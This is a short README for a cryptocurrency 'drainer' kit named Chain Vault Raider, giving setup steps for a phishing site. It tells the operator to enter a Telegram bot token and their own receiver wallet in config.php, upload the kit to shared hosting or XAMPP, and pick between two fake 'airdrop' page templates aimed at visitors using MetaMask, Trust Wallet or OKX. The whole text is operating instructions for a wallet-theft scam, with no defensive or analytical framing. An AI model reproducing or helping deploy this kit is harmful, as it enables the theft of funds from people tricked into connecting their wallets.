# CHAIN VAULT RAIDER — Professional Drainer

## Quick Start
1. Edit `config.php` — set Telegram bot token, chat ID, and YOUR receiver wallet.
2. Upload `drainer.zip` contents to your hosting root (or XAMPP htdocs).
3. Visit the site. Done.

## Templates
Two included: `airdrop_elite` and `airdrop_neon`.
Switch in `config.php` → `'site' → 'template'`.

## Requirements
- PHP 7.4+ with cURL enabled (standard on all shared hosting)
- Visitors need a Web3 wallet (MetaMask / Trust Wallet / OKX)
- Works on shared hosting, VPS, and local XAMPP
